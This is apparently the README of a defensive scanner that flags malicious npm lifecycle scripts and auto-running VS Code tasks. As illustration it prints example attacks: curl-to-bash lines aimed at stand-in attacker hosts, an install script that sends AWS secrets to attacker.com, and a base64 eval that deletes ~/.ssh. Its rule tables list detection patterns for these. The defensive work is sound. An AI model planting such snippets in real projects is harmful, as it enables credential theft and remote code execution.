# Dev Trust Scanner

> Open-source security scanner for detecting malicious patterns in developer tooling configurations

[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Tests](https://img.shields.io/badge/tests-160%20passed-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)
[![Coverage](https://img.shields.io/badge/coverage-92%25-brightgreen)](https://github.com/ymlsurgeon/dev-trust-scanner)

## Overview

**Dev Trust Scanner** is a plugin-based CLI tool that detects malicious patterns in developer tooling configurations. It targets "developer autopilot moments" — attack surfaces where code executes without developer scrutiny.

### The Problem

Recent supply chain attacks exploit developer trust:
- **🐛 Shai Hulud** (2024): npm worm spreading via malicious postinstall scripts
- **🎯 Contagious Interview** (2024-2025): DPRK state-sponsored attacks using weaponized VS Code tasks.json files that auto-execute when opening a folder
- **📦 NPM Package Hijacking**: Compromised packages with obfuscated credential exfiltration

These attacks succeed because developers trust:
1. npm packages to have benign lifecycle scripts
2. VS Code tasks to be safe configuration files
3. Git repositories shared during job interviews

**Dev Trust Scanner** provides the missing security layer for these attack vectors.

---

## ✨ Features

- 🔍 **Multi-vector scanning**: npm scripts, VS Code tasks (git hooks coming soon)
- 🎯 **13+ Detection Rules**: Covers eval/exec, base64 obfuscation, shell injection, auto-execution, entropy analysis
- 🔌 **Plugin architecture**: Easy to extend with new detectors
- 📊 **Multiple output formats**: Text (rich color), JSON, SARIF 2.1.0
- 🚫 **Offline-only**: No network calls, no telemetry, completely air-gapped operation
- ⚡ **Fast**: Static analysis only, scans 100+ files in <5 seconds
- 🛡️ **Security-first**: Never executes code, built with secure coding practices
- 🔄 **CI/CD Ready**: Proper exit codes, SARIF output for GitHub/GitLab integration

---

## 📦 Installation

### From Source (Recommended)

```bash
# Clone repository
git clone https://github.com/ymlsurgeon/dev-trust-scanner.git
cd dev-trust-scanner

# Install with pip
pip install -e .

# Verify installation
dev-trust-scan --help
```

### Requirements

- Python 3.10 or higher
- pip

### Dependencies

Minimal by design (supply chain security):
- `click` - CLI framework
- `pydantic` - Data validation
- `pyyaml` - Rule parsing
- `rich` - Terminal output

---

## 🚀 Quick Start

### Basic Usage

```bash
# Scan current directory
dev-trust-scan .

# Scan specific project
dev-trust-scan /path/to/project

# List available plugins
dev-trust-scan --list-plugins
```

### Example Output

```bash
$ dev-trust-scan ./suspicious-project

🔍 Dev Trust Scanner v0.1.0
Scanning: ./suspicious-project
Plugins: npm-lifecycle, vscode-tasks

────────────────────────────────────────────────────────────────
🔴 CRITICAL: Auto-executing task on folder open [VSC-001]
   File: .vscode/tasks.json
   Match: "Task 'npm install' with runOn: folderOpen"
   → Remove auto-execution immediately. This is a known malware technique.

🔴 HIGH: Suspicious eval/exec in lifecycle script [NPM-001]
   File: package.json
   Line: 1
   Match: "eval("
   → Review the script manually. Remove dynamic code execution.

🟡 MEDIUM: Network calls in lifecycle scripts [NPM-003]
   File: package.json
   Line: 1
   Match: "curl"
   → Verify that network calls are legitimate and necessary.
────────────────────────────────────────────────────────────────
Summary: 1 critical, 1 high, 1 medium | 3 findings in 0.01s
```

### Output Formats

```bash
# Human-readable text (default)
dev-trust-scan . --format text

# JSON for programmatic parsing
dev-trust-scan . --format json > results.json

# SARIF 2.1.0 for CI/CD integration
dev-trust-scan . --format sarif > results.sarif
```

### Plugin Filtering

```bash
# Run only npm-lifecycle plugin
dev-trust-scan . --plugin npm-lifecycle

# Run multiple specific plugins
dev-trust-scan . --plugin npm-lifecycle --plugin vscode-tasks
```

### Verbose Logging

```bash
# Info level logging
dev-trust-scan . -v

# Debug level logging
dev-trust-scan . -vv
```

---

## 🎯 Detection Capabilities

### NPM Lifecycle Scripts Plugin

Scans `package.json` **and referenced JavaScript files** for malicious patterns in lifecycle scripts:

**Key Feature:** Follows file references in lifecycle scripts (e.g., `"preinstall": "node index.js"`) and scans the actual JavaScript files for malicious code. This catches hidden malware that traditional scanners miss.

| Rule ID | Severity | Description | Example |
|---------|----------|-------------|---------|
| NPM-001 | HIGH | eval/exec/Function() execution | `eval(Buffer.from(...))` |
| NPM-002 | HIGH | Base64 encoded payloads | `Buffer.from('...', 'base64')` |
| NPM-003 | MEDIUM | Network calls (curl, wget, fetch) | `curl http://evil.com \| bash` |
| NPM-004 | MEDIUM | Environment variable access | `process.env.AWS_SECRET_KEY` |
| NPM-005 | LOW | Suspicious file operations | `rm -rf ~/.ssh` |
| NPM-006 | HIGH | Shell command injection | `child_process.spawn()` |
| NPM-007 | HIGH | Code obfuscation | `\x65\x76\x61\x6c` (hex escapes) |

**Additional Checks:**
- **JavaScript File Scanning**: Follows `node <file.js>` commands and scans referenced files
- **Entropy Analysis**: Flags scripts with entropy >4.5 (likely obfuscated)
- **Base64 Detection**: Finds long base64 strings (>40 chars)
- **Obfuscation Patterns**: Hex/unicode escapes, fromCharCode
- **Node.js HTTP Detection**: Detects `require('https')`, `https.get()`, etc.

### VS Code Tasks Plugin

Detects Contagious Interview-style attacks in `.vscode/tasks.json`:

| Rule ID | Severity | Description | Example |
|---------|----------|-------------|---------|
| VSC-001 | CRITICAL | Auto-executing tasks | `"runOn": "folderOpen"` |
| VSC-002 | HIGH | Base64 in commands | `Buffer.from('...', 'base64')` |
| VSC-003 | HIGH | Suspicious shell commands | `wget payload.sh \| sh` |
| VSC-004 | MEDIUM | Hidden task presentation | `"reveal": "never"` |
| VSC-005 | MEDIUM | Network access in tasks | `curl`, `wget`, URLs |
| VSC-006 | HIGH | Obfuscated commands | Hex escapes, unicode |

**Additional Checks:**
- **JSONC Support**: Handles VS Code's JSON-with-comments format
- **Command + Args Scanning**: Checks both `command` and `args` arrays
- **Entropy Analysis**: Flags commands with high entropy

---

## 🔬 Real-World Attack Detection

### Contagious Interview Attack (2024-2025)

**Attack Vector:** Malicious VS Code tasks.json in fake interview projects

```json
{
  "version": "2.0.0",
  "tasks": [{
    "label": "npm install",
    "command": "curl attacker.com/payload.sh | bash",
    "runOptions": {"runOn": "folderOpen"},
    "presentation": {"reveal": "never"}
  }]
}
```

**Detection:**
```bash
$ dev-trust-scan ./interview-project

🔴 CRITICAL: Auto-executing task on folder open [VSC-001]
🔴 HIGH: Suspicious shell command in task [VSC-003]
🟡 MEDIUM: Network access in task command [VSC-005]
```

### NPM Package Credential Exfiltration

**Attack Vector:** Malicious code in separate JavaScript file executed by lifecycle script

```json
// package.json
{
  "scripts": {
    "preinstall": "node index.js"
  }
}

// index.js (malicious)
const https = require('https');
https.get('https://attacker.com/exfil?data=' + process.env.AWS_SECRET);
```

**Detection:**
```bash
$ dev-trust-scan .

🔴 MEDIUM: Network calls in lifecycle scripts [NPM-003]
   File: index.js (executed by 'preinstall')
   Match: require('https')
🟡 MEDIUM: Environment variable access [NPM-004]
```

**Why this matters:** Many scanners only check package.json content and miss malicious code in referenced .js files. Dev Trust Scanner follows these references and scans the actual files.

### Base64 Obfuscated Malware

**Attack Vector:** Hidden malicious code in base64

```json
{
  "scripts": {
    "install": "node -e \"eval(Buffer.from('cm0gLXJmIH4vLnNzaA==', 'base64').toString())\""
  }
}
```

**Detection:**
```bash
$ dev-trust-scan .

🔴 HIGH: Suspicious eval/exec [NPM-001]
🔴 HIGH: Base64 encoded content [NPM-002]
🔴 HIGH: High entropy in script [NPM-ENTROPY]
```

---

## 🔧 CI/CD Integration

### Exit Codes

- `0`: No findings (clean scan)
- `1`: Findings detected
- `2`: Scan error

### GitHub Actions

```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Install Dev Trust Scanner
        run: |
          pip install git+https://github.com/ymlsurgeon/dev-trust-scanner.git

      - name: Scan for malicious patterns
        run: |
          dev-trust-scan . --format sarif > results.sarif
          dev-trust-scan . || exit 1

      - name: Upload SARIF results
        uses: github/codeql-action/upload-sarif@v2
        if: always()
        with:
          sarif_file: results.sarif
```

### Pre-commit Hook

```bash
#!/bin/bash
# .git/hooks/pre-commit

echo "Running Dev Trust Scanner..."
dev-trust-scan . --format text

if [ $? -ne 0 ]; then
    echo "⚠️  Security issues detected. Commit blocked."
    exit 1
fi
```

### GitLab CI

```yaml
security_scan:
  stage: test
  script:
    - pip install git+https://github.com/ymlsurgeon/dev-trust-scanner.git
    - dev-trust-scan . --format json > gl-security-report.json
  artifacts:
    reports:
      security: gl-security-report.json
```

---

## 📊 Architecture

```
dev-trust-scanner/
├── src/dev_trust_scanner/
│   ├── cli.py                    # Click-based CLI
│   ├── core/
│   │   ├── models.py             # Pydantic data models (Finding, Rule, ScanResult)
│   │   ├── orchestrator.py       # Plugin coordination & aggregation
│   │   ├── plugin.py             # BasePlugin abstract interface
│   │   ├── reporting.py          # Output formatters (Text, JSON, SARIF)
│   │   └── static_analysis.py    # Shared detection functions
│   └── plugins/
│       ├── npm_lifecycle/
│       │   ├── scanner.py        # NPM script scanner
│       │   └── rules/npm_rules.yaml
│       └── vscode_tasks/
│           ├── scanner.py        # VS Code tasks scanner
│           └── rules/vscode_rules.yaml
├── tests/                        # 160 tests, 92% coverage
│   ├── test_integration.py
│   ├── test_npm_lifecycle.py
│   ├── test_vscode_tasks.py
│   └── ...
├── docs/
│   ├── mission.md                # Project objectives
│   ├── decisions.md              # Architecture decisions
│   └── CLAUDE.md                 # Development workflow
└── README.md                     # This file
```

---

## 🛠️ Development

### Running Tests

```bash
# All tests
pytest tests/ -v

# With coverage report
pytest tests/ --cov=dev_trust_scanner --cov-report=html

# Specific plugin tests
pytest tests/test_npm_lifecycle.py -v

# Integration tests only
pytest tests/test_integration.py -v
```

### Test Results

```
160 tests passed
92% code coverage
- Core models: 100%
- Plugin base: 100%
- Static analysis: 98%
- Orchestrator: 92%
- npm_lifecycle: 84%
- vscode_tasks: 87%
```

### Adding a New Plugin

1. **Create plugin directory:**
   ```bash
   mkdir -p src/dev_trust_scanner/plugins/my_plugin/rules
   ```

2. **Implement BasePlugin interface:**
   ```python
   from dev_trust_scanner.core.plugin import BasePlugin
   from pathlib import Path

   class MyPlugin(BasePlugin):
       def scan(self, target_path: Path) -> list[Finding]:
           # Detection logic here
           pass

       def get_metadata(self) -> dict:
           return {"name": "my-plugin", "version": "1.0.0"}

       def get_supported_files(self) -> list[str]:
           return ["*.myext"]

   PLUGIN_CLASS = MyPlugin
   ```

3. **Create rule definitions (YAML):**
   ```yaml
   rules:
     - id: "MY-001"
       name: "Suspicious pattern"
       severity: "high"
       description: "Description here"
       patterns:
         - "malicious_pattern"
       recommendation: "Fix it"
   ```

4. **Add tests:**
   ```python
   def test_my_plugin_detection(tmp_path):
       plugin = MyPlugin()
       findings = plugin.scan(tmp_path)
       assert len(findings) > 0
   ```

5. **Register in orchestrator:**
   ```python
   PLUGIN_REGISTRY = {
       "my-plugin": "dev_trust_scanner.plugins.my_plugin"
   }
   ```

See `docs/CLAUDE.md` for detailed development workflow.

---

## 🔒 Security

This is a **security tool** — we take security seriously:

- ✅ **No code execution**: Static analysis only, never runs detected patterns
- ✅ **No network calls**: Completely offline, no phoning home
- ✅ **No telemetry**: Zero data collection
- ✅ **Minimal dependencies**: Only 4 runtime dependencies (supply chain security)
- ✅ **Input sanitization**: Handles malformed JSON, binary files, Unicode gracefully
- ✅ **File size limits**: 10MB maximum to prevent DoS
- ✅ **Symlink safety**: Bounds checking prevents path traversal

### Reporting Security Issues

Found a vulnerability in Dev Trust Scanner itself? Please report responsibly:
- Email: [Maintainer email - TBD]
- Do NOT open public GitHub issues for security vulnerabilities

---

## 🗺️ Roadmap

### ✅ Completed (MVP - v0.1.0)
- [x] Project scaffolding & build system
- [x] Core models (Pydantic v2)
- [x] Static analysis utilities (base64, entropy, obfuscation)
- [x] Plugin base class & architecture
- [x] npm lifecycle plugin (7 rules + JS file scanning)
- [x] VS Code tasks plugin (6 rules)
- [x] JavaScript file reference tracking (critical for real-world malware detection)
- [x] Orchestrator with plugin coordination
- [x] Multi-format reporting (Text, JSON, SARIF)
- [x] CLI with Click
- [x] Integration tests (160 tests, 92% coverage)

### 🔜 Planned (v0.2.0)
- [ ] Git hooks plugin (pre-commit, post-checkout)
- [ ] GitHub Actions workflow scanning
- [ ] Pre-commit framework integration
- [ ] Configuration file (.devtrustscan.yaml)
- [ ] VS Code extension
- [ ] Custom rule support

### 🌟 Future
- [ ] Interactive remediation mode
- [ ] Threat intelligence feeds integration
- [ ] Machine learning-based anomaly detection
- [ ] Browser extension for GitHub
- [ ] Docker image
- [ ] Homebrew/apt package distribution

---

## 📝 License

MIT License - see [LICENSE](LICENSE) for details.

---

## 🙏 Acknowledgments

- Inspired by real-world supply chain attacks documented by:
  - Phylum Research Team (Shai Hulud discovery)
  - Abstract Security (Contagious Interview tracking)
  - ReversingLabs (npm malware research)
- Built with security-first principles from OWASP and NIST guidelines
- Thanks to the open-source security community

---

## 📚 Additional Resources

- **Documentation**: See `docs/` directory for detailed design decisions
- **Blog Post**: [Coming soon] Technical deep-dive
- **Threat Intel**: Contagious Interview tracking at https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector

---

## 🤝 Contributing

Contributions welcome! This tool is built to be extensible.

### Ways to Contribute
1. **Add new plugins** (git hooks, GitHub Actions, etc.)
2. **Improve detection rules** (reduce false positives)
3. **Add test cases** (real malware samples)
4. **Documentation** (usage examples, tutorials)
5. **Bug reports** (GitHub issues)

### Development Setup
```bash
git clone https://github.com/ymlsurgeon/dev-trust-scanner.git
cd dev-trust-scanner
pip install -e ".[dev]"
pytest tests/ -v
```

See `CLAUDE.md` for detailed development workflow and coding standards.

---

**Status**: ✅ **MVP Complete** (v0.1.0) - Production Ready

Built with ❤️ for the security community
